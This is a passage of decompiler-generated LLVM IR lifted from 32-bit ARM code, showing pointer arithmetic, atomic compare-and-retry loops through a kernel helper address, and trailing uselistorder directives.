  %v1_10100 = load i32, i32* %r3.global-to-local, align 4
  %v2_10100 = trunc i32 %v1_10100 to i16
  %v3_10100 = load i32, i32* @r5, align 4
  %v4_10100 = inttoptr i32 %v3_10100 to i16*
  store i16 %v2_10100, i16* %v4_10100, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_100e0
  %v2_100f837 = add i32 %v1_100f8.pre, 8
  %v3_100f838 = inttoptr i32 %v2_100f837 to i32*
  store i32 0, i32* %v3_100f838, align 4
  %v2_10104 = load i32, i32* @r5, align 4
  %v3_10104 = add i32 %v2_10104, 12
  %v4_10104 = inttoptr i32 %v3_10104 to i32*
  store i32 0, i32* %v4_10104, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_100d4, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_10110 = load i32, i32* @r8, align 4
  %v2_10110 = add i32 %v0_10110, 92
  %v3_10110 = inttoptr i32 %v2_10110 to i32*
  %v4_10110 = load i32, i32* %v3_10110, align 4
  store i32 %v4_10110, i32* %r3.global-to-local, align 4
  %v2_10114 = load i32, i32* @r5, align 4
  %v3_10114 = add i32 %v2_10114, 2
  %v4_10114 = inttoptr i32 %v3_10114 to i8*
  store i8 0, i8* %v4_10114, align 1
  %v0_10118 = load i32, i32* @r5, align 4
  %v1_10118 = inttoptr i32 %v0_10118 to i16*
  %v2_10118 = load i16, i16* %v1_10118, align 2
  %v3_10118 = zext i16 %v2_10118 to i32
  store i32 %v3_10118, i32* %r2.global-to-local, align 4
  %v0_1011c = load i32, i32* %r3.global-to-local, align 4
  %v1_1011c = inttoptr i32 %v0_1011c to i32*
  %v2_1011c = load i32, i32* %v1_1011c, align 4
  store i32 %v2_1011c, i32* @r1, align 4
  %v1_10120 = add i32 %v0_10118, 8
  %v2_10120 = inttoptr i32 %v1_10120 to i32*
  %v3_10120 = load i32, i32* %v2_10120, align 4
  store i32 %v3_10120, i32* %r3.global-to-local, align 4
  %v1_10124 = and i32 %v3_10118, 8192
  %v2_10124 = icmp eq i32 %v1_10124, 0
  %v2_10128 = add i32 %v0_10118, 20
  %v3_10128 = inttoptr i32 %v2_10128 to i32*
  store i32 %v3_10120, i32* %v3_10128, align 4
  %v0_1012c = load i32, i32* @r1, align 4
  %v1_1012c = load i32, i32* @r5, align 4
  %v2_1012c = add i32 %v1_1012c, 52
  %v3_1012c = inttoptr i32 %v2_1012c to i32*
  store i32 %v0_1012c, i32* %v3_1012c, align 4
  %v0_10130 = load i32, i32* %r3.global-to-local, align 4
  %v1_10130 = load i32, i32* @r5, align 4
  %v2_10130 = add i32 %v1_10130, 24
  %v3_10130 = inttoptr i32 %v2_10130 to i32*
  store i32 %v0_10130, i32* %v3_10130, align 4
  %v0_10134 = load i32, i32* %r3.global-to-local, align 4
  %v1_10134 = load i32, i32* @r5, align 4
  %v2_10134 = add i32 %v1_10134, 28
  %v3_10134 = inttoptr i32 %v2_10134 to i32*
  store i32 %v0_10134, i32* %v3_10134, align 4
  %v0_10138 = load i32, i32* %r3.global-to-local, align 4
  %v1_10138 = load i32, i32* @r5, align 4
  %v2_10138 = add i32 %v1_10138, 16
  %v3_10138 = inttoptr i32 %v2_10138 to i32*
  store i32 %v0_10138, i32* %v3_10138, align 4
  %v0_1013c = load i32, i32* %r4.global-to-local, align 4
  %v1_1013c = load i32, i32* @r5, align 4
  %v2_1013c = add i32 %v1_1013c, 44
  %v3_1013c = inttoptr i32 %v2_1013c to i32*
  store i32 %v0_1013c, i32* %v3_1013c, align 4
  br i1 %v2_10124, label %dec_label_pc_10324, label %dec_label_pc_10144

dec_label_pc_10144:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_10148 = load i32, i32* @r8, align 4
  %v2_10148 = add i32 %v0_10148, 160
  %v3_10148 = inttoptr i32 %v2_10148 to i32*
  %v4_10148 = load i32, i32* %v3_10148, align 4
  store i32 %v4_10148, i32* %r7.global-to-local, align 4
  %v0_1014c = call i32 @function_f150()
  store i32 %v0_1014c, i32* %r0.global-to-local, align 4
  %v1_10150 = add i32 %v4_10148, 8
  %v2_10150 = inttoptr i32 %v1_10150 to i32*
  %v3_10150 = load i32, i32* %v2_10150, align 4
  store i32 %v3_10150, i32* %r3.global-to-local, align 4
  %v1_10154 = add i32 %v0_1014c, -1168
  store i32 %v1_10154, i32* %r6.global-to-local, align 4
  %v3_10158 = icmp uge i32 %v3_10150, %v1_10154
  store i1 %v3_10158, i1* %cpsr_c.global-to-local, align 1
  %v9_10158 = icmp eq i32 %v3_10150, %v1_10154
  br i1 %v9_10158, label %dec_label_pc_1019c, label %dec_label_pc_10160

dec_label_pc_10160:                               ; preds = %dec_label_pc_10144
  store i32 %v4_10148, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10168

dec_label_pc_10168:                               ; preds = %dec_label_pc_10174.dec_label_pc_10168_crit_edge, %dec_label_pc_10160
  %v0_10168 = phi i32 [ %v0_10168.pre, %dec_label_pc_10174.dec_label_pc_10168_crit_edge ], [ %v4_10148, %dec_label_pc_10160 ]
  %v1_10168 = inttoptr i32 %v0_10168 to i32*
  %v2_10168 = load i32, i32* %v1_10168, align 4
  store i32 %v2_10168, i32* %r3.global-to-local, align 4
  %v1_1016c = load i32, i32* %r4.global-to-local, align 4
  %v3_1016c = icmp uge i32 %v2_10168, %v1_1016c
  store i1 %v3_1016c, i1* %cpsr_c.global-to-local, align 1
  %v9_1016c = icmp eq i32 %v2_10168, %v1_1016c
  br i1 %v9_1016c, label %dec_label_pc_10174, label %dec_label_pc_1018c

dec_label_pc_10174:                               ; preds = %dec_label_pc_10168
  store i32 %v2_10168, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10184 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10184, label %dec_label_pc_10188, label %dec_label_pc_10174.dec_label_pc_10168_crit_edge

dec_label_pc_10174.dec_label_pc_10168_crit_edge:  ; preds = %dec_label_pc_10174
  %v0_10168.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10168

dec_label_pc_10188:                               ; preds = %dec_label_pc_10174
  %v0_10188 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10188, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1018c

dec_label_pc_1018c:                               ; preds = %dec_label_pc_10168, %dec_label_pc_10188
  %v0_1018c = phi i32 [ %v0_10188, %dec_label_pc_10188 ], [ %v2_10168, %dec_label_pc_10168 ]
  %v1_1018c = phi i32 [ %v0_10188, %dec_label_pc_10188 ], [ %v1_1016c, %dec_label_pc_10168 ]
  %v3_1018c = icmp uge i32 %v0_1018c, %v1_1018c
  store i1 %v3_1018c, i1* %cpsr_c.global-to-local, align 1
  %v9_1018c = icmp eq i32 %v0_1018c, %v1_1018c
  br i1 %v9_1018c, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_1018c
  %v1_10190 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_10190, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_1018c, %bb58
  %v1_10194 = xor i1 %v9_1018c, true
  call void @__pseudo_cond_branch(i1 %v1_10194, i32 ptrtoint (i32* @global_var_e3fc.444 to i32))
  %v0_10198 = load i32, i32* %r6.global-to-local, align 4
  %v1_10198 = load i32, i32* %r7.global-to-local, align 4
  %v2_10198 = add i32 %v1_10198, 8
  %v3_10198 = inttoptr i32 %v2_10198 to i32*
  store i32 %v0_10198, i32* %v3_10198, align 4
  %v1_101b8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1019c

dec_label_pc_1019c:                               ; preds = %dec_label_pc_10144, %bb59
  %v1_101b8 = phi i32 [ %v3_10150, %dec_label_pc_10144 ], [ %v1_101b8.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_101a0 = load i32, i32* @r8, align 4
  %v2_101a0 = add i32 %v0_101a0, 160
  %v3_101a0 = inttoptr i32 %v2_101a0 to i32*
  %v4_101a0 = load i32, i32* %v3_101a0, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_101a8 = add i32 %v0_101a0, 152
  %v3_101a8 = inttoptr i32 %v2_101a8 to i32*
  %v4_101a8 = load i32, i32* %v3_101a8, align 4
  store i32 %v4_101a8, i32* %r7.global-to-local, align 4
  %v1_101ac = add i32 %v4_101a0, 4
  %v2_101ac = inttoptr i32 %v1_101ac to i32*
  %v3_101ac = load i32, i32* %v2_101ac, align 4
  store i32 %v3_101ac, i32* %r3.global-to-local, align 4
  %v1_101b0 = add i32 %v4_101a8, 8
  %v2_101b0 = inttoptr i32 %v1_101b0 to i32*
  %v3_101b0 = load i32, i32* %v2_101b0, align 4
  store i32 %v3_101b0, i32* %r2.global-to-local, align 4
  %v1_101b4 = add i32 %v3_101ac, 1
  store i32 %v1_101b4, i32* %r3.global-to-local, align 4
  %v3_101b8 = icmp uge i32 %v3_101b0, %v1_101b8
  store i1 %v3_101b8, i1* %cpsr_c.global-to-local, align 1
  %v9_101b8 = icmp eq i32 %v3_101b0, %v1_101b8
  store i32 %v1_101b4, i32* %v2_101ac, align 4
  br i1 %v9_101b8, label %dec_label_pc_10204, label %dec_label_pc_101c4

dec_label_pc_101c4:                               ; preds = %dec_label_pc_1019c
  %v0_101c8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_101c8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_101d095 = inttoptr i32 %v0_101c8 to i32*
  %v2_101d096 = load i32, i32* %v1_101d095, align 4
  store i32 %v2_101d096, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_101d498 = icmp eq i32 %v2_101d096, 0
  br i1 %v9_101d498, label %dec_label_pc_101dc, label %dec_label_pc_101f4

dec_label_pc_101dc:                               ; preds = %dec_label_pc_101c4, %dec_label_pc_101dc.dec_label_pc_101d0_crit_edge
  %v0_101dc99 = phi i32 [ %v1_101d4.pre, %dec_label_pc_101dc.dec_label_pc_101d0_crit_edge ], [ 0, %dec_label_pc_101c4 ]
  store i32 %v0_101dc99, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_101ec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_101ec, label %dec_label_pc_101f0, label %dec_label_pc_101dc.dec_label_pc_101d0_crit_edge

dec_label_pc_101dc.dec_label_pc_101d0_crit_edge:  ; preds = %dec_label_pc_101dc
  %v0_101d0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_101d4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_101d0 = inttoptr i32 %v0_101d0.pre to i32*
  %v2_101d0 = load i32, i32* %v1_101d0, align 4
  store i32 %v2_101d0, i32* %r3.global-to-local, align 4
  %v3_101d4 = icmp uge i32 %v2_101d0, %v1_101d4.pre
  store i1 %v3_101d4, i1* %cpsr_c.global-to-local, align 1
  %v9_101d4 = icmp eq i32 %v2_101d0, %v1_101d4.pre
  br i1 %v9_101d4, label %dec_label_pc_101dc, label %dec_label_pc_101f4

dec_label_pc_101f0:                               ; preds = %dec_label_pc_101dc
  %v0_101f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_101f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_101f4

dec_label_pc_101f4:                               ; preds = %dec_label_pc_101c4, %dec_label_pc_101dc.dec_label_pc_101d0_crit_edge, %dec_label_pc_101f0
  %v0_101f4 = phi i32 [ %v0_101f0, %dec_label_pc_101f0 ], [ %v2_101d096, %dec_label_pc_101c4 ], [ %v2_101d0, %dec_label_pc_101dc.dec_label_pc_101d0_crit_edge ]
  %v1_101f4 = phi i32 [ %v0_101f0, %dec_label_pc_101f0 ], [ 0, %dec_label_pc_101c4 ], [ %v1_101d4.pre, %dec_label_pc_101dc.dec_label_pc_101d0_crit_edge ]
  %v3_101f4 = icmp uge i32 %v0_101f4, %v1_101f4
  store i1 %v3_101f4, i1* %cpsr_c.global-to-local, align 1
  %v9_101f4 = icmp eq i32 %v0_101f4, %v1_101f4
  br i1 %v9_101f4, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_101f4
  %v1_101f8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_101f8, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_101f4, %bb60
  %v1_101fc = xor i1 %v9_101f4, true
  call void @__pseudo_cond_branch(i1 %v1_101fc, i32 ptrtoint (i32* @global_var_e3fc.444 to i32))
  %v0_10200 = load i32, i32* %r6.global-to-local, align 4
  %v1_10200 = load i32, i32* %r7.global-to-local, align 4
  %v2_10200 = add i32 %v1_10200, 8
  %v3_10200 = inttoptr i32 %v2_10200 to i32*
  store i32 %v0_10200, i32* %v3_10200, align 4
  br label %dec_label_pc_10204

dec_label_pc_10204:                               ; preds = %dec_label_pc_1019c, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_10208 = load i32, i32* @r8, align 4
  %v2_10208 = add i32 %v0_10208, 152
  %v3_10208 = inttoptr i32 %v2_10208 to i32*
  %v4_10208 = load i32, i32* %v3_10208, align 4
  store i32 %v4_10208, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_10210 = add i32 %v0_10208, 76
  %v3_10210 = inttoptr i32 %v2_10210 to i32*
  %v4_10210 = load i32, i32* %v3_10210, align 4
  store i32 %v4_10210, i32* @r1, align 4
  %v1_10214 = add i32 %v4_10208, 4
  %v2_10214 = inttoptr i32 %v1_10214 to i32*
  %v3_10214 = load i32, i32* %v2_10214, align 4
  store i32 %v3_10214, i32* %r3.global-to-local, align 4
  %v1_10218 = inttoptr i32 %v4_10210 to i32*
  %v2_10218 = load i32, i32* %v1_10218, align 4
  store i32 %v2_10218, i32* %r2.global-to-local, align 4
  %v1_1021c = add i32 %v3_10214, 1
  store i32 %v1_1021c, i32* %r3.global-to-local, align 4
  store i32 %v1_1021c, i32* %v2_10214, align 4
  %v0_10224 = load i32, i32* %r2.global-to-local, align 4
  %v1_10224 = load i32, i32* @r5, align 4
  %v2_10224 = add i32 %v1_10224, 32
  %v3_10224 = inttoptr i32 %v2_10224 to i32*
  store i32 %v0_10224, i32* %v3_10224, align 4
  %v0_10228 = load i32, i32* %r0.global-to-local, align 4
  %v1_10228 = add i32 %v0_10228, 4
  %v2_10228 = inttoptr i32 %v1_10228 to i32*
  %v3_10228 = load i32, i32* %v2_10228, align 4
  %v1_1022c = add i32 %v3_10228, -1
  store i32 %v1_1022c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10230 = icmp eq i32 %v1_1022c, 0
  %v0_10234 = load i32, i32* @r5, align 4
  %v1_10234 = load i32, i32* @r1, align 4
  %v2_10234 = inttoptr i32 %v1_10234 to i32*
  store i32 %v0_10234, i32* %v2_10234, align 4
  %v0_10238 = load i32, i32* %r3.global-to-local, align 4
  %v1_10238 = load i32, i32* %r0.global-to-local, align 4
  %v2_10238 = add i32 %v1_10238, 4
  %v3_10238 = inttoptr i32 %v2_10238 to i32*
  store i32 %v0_10238, i32* %v3_10238, align 4
  br i1 %v2_10230, label %dec_label_pc_10240, label %dec_label_pc_102a0

dec_label_pc_10240:                               ; preds = %dec_label_pc_10204
  %v0_10240 = load i32, i32* %r3.global-to-local, align 4
  %v1_10240 = load i32, i32* %r0.global-to-local, align 4
  %v2_10240 = add i32 %v1_10240, 8
  %v3_10240 = inttoptr i32 %v2_10240 to i32*
  store i32 %v0_10240, i32* %v3_10240, align 4
  %v0_10244 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10244, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10248

dec_label_pc_10248:                               ; preds = %dec_label_pc_10278.dec_label_pc_10248_crit_edge, %dec_label_pc_10240
  %v0_10248 = phi i32 [ %v0_10248.pre, %dec_label_pc_10278.dec_label_pc_10248_crit_edge ], [ %v0_10244, %dec_label_pc_10240 ]
  %v1_10248 = inttoptr i32 %v0_10248 to i32*
  %v2_10248 = load i32, i32* %v1_10248, align 4
  store i32 %v2_10248, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_10248, i32* %r2.global-to-local, align 4
  %v2_1025483 = load i32, i32* %v1_10248, align 4
  store i32 %v2_1025483, i32* %r3.global-to-local, align 4
  %v3_1025885 = icmp uge i32 %v2_1025483, %v2_10248
  store i1 %v3_1025885, i1* %cpsr_c.global-to-local, align 1
  %v9_1025891 = icmp eq i32 %v2_1025483, %v2_10248
  br i1 %v9_1025891, label %dec_label_pc_10260, label %dec_label_pc_10278

dec_label_pc_10260:                               ; preds = %dec_label_pc_10248, %dec_label_pc_10260.dec_label_pc_10254_crit_edge
  %v0_1026092 = phi i32 [ %v1_10258.pre, %dec_label_pc_10260.dec_label_pc_10254_crit_edge ], [ %v2_10248, %dec_label_pc_10248 ]
  store i32 %v0_1026092, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10270 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10270, label %dec_label_pc_10274, label %dec_label_pc_10260.dec_label_pc_10254_crit_edge

dec_label_pc_10260.dec_label_pc_10254_crit_edge:  ; preds = %dec_label_pc_10260
  %v0_10254.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10258.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10254 = inttoptr i32 %v0_10254.pre to i32*
  %v2_10254 = load i32, i32* %v1_10254, align 4
  store i32 %v2_10254, i32* %r3.global-to-local, align 4
  %v3_10258 = icmp uge i32 %v2_10254, %v1_10258.pre
  store i1 %v3_10258, i1* %cpsr_c.global-to-local, align 1
  %v9_10258 = icmp eq i32 %v2_10254, %v1_10258.pre
  br i1 %v9_10258, label %dec_label_pc_10260, label %dec_label_pc_10278

dec_label_pc_10274:                               ; preds = %dec_label_pc_10260
  %v0_10274 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10274, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10278

dec_label_pc_10278:                               ; preds = %dec_label_pc_10248, %dec_label_pc_10260.dec_label_pc_10254_crit_edge, %dec_label_pc_10274
  %v0_10280 = phi i32 [ %v0_10274, %dec_label_pc_10274 ], [ %v2_1025483, %dec_label_pc_10248 ], [ %v2_10254, %dec_label_pc_10260.dec_label_pc_10254_crit_edge ]
  %v1_10278 = phi i32 [ %v0_10274, %dec_label_pc_10274 ], [ %v2_10248, %dec_label_pc_10248 ], [ %v1_10258.pre, %dec_label_pc_10260.dec_label_pc_10254_crit_edge ]
  %v3_10278 = icmp uge i32 %v0_10280, %v1_10278
  store i1 %v3_10278, i1* %cpsr_c.global-to-local, align 1
  %v9_10278 = icmp eq i32 %v0_10280, %v1_10278
  br i1 %v9_10278, label %dec_label_pc_10280, label %dec_label_pc_10278.dec_label_pc_10248_crit_edge

dec_label_pc_10278.dec_label_pc_10248_crit_edge:  ; preds = %dec_label_pc_10278
  %v0_10248.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10248

dec_label_pc_10280:                               ; preds = %dec_label_pc_10278
  %v2_10280 = icmp ne i32 %v1_10278, 0
  store i1 %v2_10280, i1* %cpsr_c.global-to-local, align 1
  %v7_10284 = icmp slt i32 %v1_10278, 2
  br i1 %v7_10284, label %dec_label_pc_102a0, label %dec_label_pc_10288

dec_label_pc_10288:                               ; preds = %dec_label_pc_10280
  %v0_10288 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10288, i32* %r0.global-to-local, align 4
  %v0_1028c = load i32, i32* @r1, align 4
  %v1_1028c = add i32 %v0_1028c, 129
  store i32 %v1_1028c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_102a0

dec_label_pc_102a0:                               ; preds = %dec_label_pc_10204, %dec_label_pc_10288, %dec_label_pc_10280
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_102a4 = load i32, i32* @r8, align 4
  %v2_102a4 = add i32 %v0_102a4, 160
  %v3_102a4 = inttoptr i32 %v2_102a4 to i32*
  %v4_102a4 = load i32, i32* %v3_102a4, align 4
  store i32 %v4_102a4, i32* %r0.global-to-local, align 4
  %v1_102a8 = add i32 %v4_102a4, 4
  %v2_102a8 = inttoptr i32 %v1_102a8 to i32*
  %v3_102a8 = load i32, i32* %v2_102a8, align 4
  %v1_102ac = add i32 %v3_102a8, -1
  store i32 %v1_102ac, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_102b0 = icmp eq i32 %v1_102ac, 0
  store i32 %v1_102ac, i32* %v2_102a8, align 4
  br i1 %v2_102b0, label %dec_label_pc_102bc, label %dec_label_pc_10324

dec_label_pc_102bc:                               ; preds = %dec_label_pc_102a0
  %v0_102bc = load i32, i32* %r3.global-to-local, align 4
  %v1_102bc = load i32, i32* %r0.global-to-local, align 4
  %v2_102bc = add i32 %v1_102bc, 8
  %v3_102bc = inttoptr i32 %v2_102bc to i32*
  store i32 %v0_102bc, i32* %v3_102bc, align 4
  %v0_102c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_102c0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_102c4

dec_label_pc_102c4:                               ; preds = %dec_label_pc_102f4.dec_label_pc_102c4_crit_edge, %dec_label_pc_102bc
  %v0_102c4 = phi i32 [ %v0_102c4.pre, %dec_label_pc_102f4.dec_label_pc_102c4_crit_edge ], [ %v0_102c0, %dec_label_pc_102bc ]
  %v1_102c4 = inttoptr i32 %v0_102c4 to i32*
  %v2_102c4 = load i32, i32* %v1_102c4, align 4
  store i32 %v2_102c4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_102c4, i32* %r2.global-to-local, align 4
  %v2_102d071 = load i32, i32* %v1_102c4, align 4
  store i32 %v2_102d071, i32* %r3.global-to-local, align 4
  %v3_102d473 = icmp uge i32 %v2_102d071, %v2_102c4
  store i1 %v3_102d473, i1* %cpsr_c.global-to-local, align 1
  %v9_102d479 = icmp eq i32 %v2_102d071, %v2_102c4
  br i1 %v9_102d479, label %dec_label_pc_102dc, label %dec_label_pc_102f4

dec_label_pc_102dc:                               ; preds = %dec_label_pc_102c4, %dec_label_pc_102dc.dec_label_pc_102d0_crit_edge
  %v0_102dc80 = phi i32 [ %v1_102d4.pre, %dec_label_pc_102dc.dec_label_pc_102d0_crit_edge ], [ %v2_102c4, %dec_label_pc_102c4 ]
  store i32 %v0_102dc80, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_102ec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_102ec, label %dec_label_pc_102f0, label %dec_label_pc_102dc.dec_label_pc_102d0_crit_edge

dec_label_pc_102dc.dec_label_pc_102d0_crit_edge:  ; preds = %dec_label_pc_102dc
  %v0_102d0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_102d4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_102d0 = inttoptr i32 %v0_102d0.pre to i32*
  %v2_102d0 = load i32, i32* %v1_102d0, align 4
  store i32 %v2_102d0, i32* %r3.global-to-local, align 4
  %v3_102d4 = icmp uge i32 %v2_102d0, %v1_102d4.pre
  store i1 %v3_102d4, i1* %cpsr_c.global-to-local, align 1
  %v9_102d4 = icmp eq i32 %v2_102d0, %v1_102d4.pre
  br i1 %v9_102d4, label %dec_label_pc_102dc, label %dec_label_pc_102f4

dec_label_pc_102f0:                               ; preds = %dec_label_pc_102dc
  %v0_102f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_102f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_102f4

dec_label_pc_102f4:                               ; preds = %dec_label_pc_102c4, %dec_label_pc_102dc.dec_label_pc_102d0_crit_edge, %dec_label_pc_102f0
  %v0_102fc = phi i32 [ %v0_102f0, %dec_label_pc_102f0 ], [ %v2_102d071, %dec_label_pc_102c4 ], [ %v2_102d0, %dec_label_pc_102dc.dec_label_pc_102d0_crit_edge ]
  %v1_102f4 = phi i32 [ %v0_102f0, %dec_label_pc_102f0 ], [ %v2_102c4, %dec_label_pc_102c4 ], [ %v1_102d4.pre, %dec_label_pc_102dc.dec_label_pc_102d0_crit_edge ]
  %v3_102f4 = icmp uge i32 %v0_102fc, %v1_102f4
  store i1 %v3_102f4, i1* %cpsr_c.global-to-local, align 1
  %v9_102f4 = icmp eq i32 %v0_102fc, %v1_102f4
  br i1 %v9_102f4, label %dec_label_pc_102fc, label %dec_label_pc_102f4.dec_label_pc_102c4_crit_edge

dec_label_pc_102f4.dec_label_pc_102c4_crit_edge:  ; preds = %dec_label_pc_102f4
  %v0_102c4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_102c4

dec_label_pc_102fc:                               ; preds = %dec_label_pc_102f4
  %v2_102fc = icmp ne i32 %v1_102f4, 0
  store i1 %v2_102fc, i1* %cpsr_c.global-to-local, align 1
  %v7_10300 = icmp slt i32 %v1_102f4, 2
  br i1 %v7_10300, label %dec_label_pc_10324, label %dec_label_pc_10304

dec_label_pc_10304:                               ; preds = %dec_label_pc_102fc
  %v0_10304 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10304, i32* %r0.global-to-local, align 4
  %v0_10308 = load i32, i32* @r1, align 4
  %v1_10308 = add i32 %v0_10308, 129
  store i32 %v1_10308, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10324

dec_label_pc_10320:                               ; preds = %dec_label_pc_ff64, %dec_label_pc_ff48, %dec_label_pc_ff70
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_10324

dec_label_pc_10324:                               ; preds = %dec_label_pc_102a0, %dec_label_pc_102fc, %bb57, %dec_label_pc_ffa8, %dec_label_pc_10304, %dec_label_pc_10320
  %v0_10324 = load i32, i32* @r5, align 4
  store i32 %v0_10324, i32* %r0.global-to-local, align 4
  %v2_1032c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1032c, i32* %r4.global-to-local, align 4
  store i32 %v6_ff08, i32* @r5, align 4
  store i32 %v9_ff08, i32* @r6, align 4
  store i32 %v12_ff08, i32* @r7, align 4
  store i32 %v15_ff08, i32* @r8, align 4
  ret i32 %v0_10324

; uselistorder directives
  uselistorder i32 %v0_102f0, { 1, 0, 2 }
  uselistorder i32 %v1_102d4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_102c4, { 1, 0 }
  uselistorder i32 %v0_10274, { 1, 0, 2 }
  uselistorder i32 %v1_10258.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10248, { 1, 0 }
  uselistorder i32 %v0_101f0, { 1, 0, 2 }
  uselistorder i32 %v1_101d4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10188, { 1, 0, 2 }
  uselistorder i32 %v1_1016c, { 0, 2, 1 }
  uselistorder i32 %v4_10148, { 2, 1, 0, 3 }
  uselistorder i32 %v1_100f8.pre, { 2, 1, 0 }
  uselistorder i32 %v0_1007c, { 1, 2, 0 }
  uselistorder i32 %v1_1000c, { 1, 0 }
  uselistorder i32 %v0_1000c, { 1, 0 }
  uselistorder i32 %v1_fff4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_ff98, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 49, 5, 6, 7, 8, 9, 11, 10, 50, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 48, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 51, 0, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 19, 18, 30, 21, 20, 23, 22, 24, 25, 27, 26, 28, 29 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 36, 37, 3, 4, 5, 6, 26, 27, 7, 8, 9, 24, 25, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32 16384, { 21, 22, 0, 23, 10, 32, 7, 24, 6, 25, 12, 26, 13, 27, 8, 28, 9, 29, 3, 30, 4, 31, 14, 33, 11, 34, 5, 36, 15, 35, 2, 37, 16, 38, 1, 17, 39, 40, 18, 41, 19, 42, 20, 43 }
  uselistorder i32 4096, { 11, 7, 12, 13, 2, 0, 3, 16, 4, 14, 15, 8, 6, 1, 9, 5, 10 }
  uselistorder i32 32768, { 2, 6, 0, 3, 7, 1, 5, 4 }
  uselistorder i32 (i32, i32)* @function_e7b0, { 2, 0, 1 }
